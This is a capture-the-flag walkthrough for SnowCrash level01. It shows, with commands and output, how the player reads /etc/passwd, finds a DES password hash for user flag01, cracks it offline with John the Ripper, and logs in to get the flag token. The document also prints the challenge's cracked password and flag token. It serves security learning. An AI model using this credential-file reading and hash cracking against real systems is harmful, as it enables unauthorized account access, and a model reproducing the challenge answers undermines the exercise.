# Level01

## Hint

Perhaps you could take at look at Linux system's configuration files. In particular, you could check the `/etc/` folder.

## Answer

Same as before let's check our current directory:
```
level01@SnowCrash:~$ ll
total 12
dr-x------ 1 level01 level01  100 Mar  5  2016 ./
d--x--x--x 1 root    users    340 Aug 30  2015 ../
-r-x------ 1 level01 level01  220 Apr  3  2012 .bash_logout*
-r-x------ 1 level01 level01 3518 Aug 30  2015 .bashrc*
-r-x------ 1 level01 level01  675 Apr  3  2012 .profile*
```

Still nothing, yet again here I spent a lot of time trying a lot of things, which I won't go into details, but we do know that password are stored in `/etc/passwd` and `/etc/shadow` files. So let's see what's in them:
```
level01@SnowCrash:~$ cat /etc/shadow
cat: /etc/shadow: Permission denied
```

Ok let's try the same with `/etc/passwd`:
```
level01@SnowCrash:~$ cat /etc/passwd
[...]
level12:x:2012:2012::/home/user/level12:/bin/bash
level13:x:2013:2013::/home/user/level13:/bin/bash
level14:x:2014:2014::/home/user/level14:/bin/bash
flag00:x:3000:3000::/home/flag/flag00:/bin/bash
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
[...]
```

We just found the hashed password for the user `flag01`. let's crack the password using john the ripper aka `john`, since we cannot use john on the VM let's do it on our own machine:
```
➜  ~ echo 42hDRfypTqqnw > password
➜  ~ john password
Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 SSE2-16])
No password hashes left to crack (see FAQ)
➜  ~ john --show password
?:abcdefg

1 password hash cracked, 0 left
```

Perfect ! We found the password for the user `flag01`, let's login:
```
level01@SnowCrash:~$ su flag01
Password:
Don't forget to launch getflag !
flag01@SnowCrash:~$ getflag
Check flag.Here is your token : f2av5il02puano7naaf6adaaf
```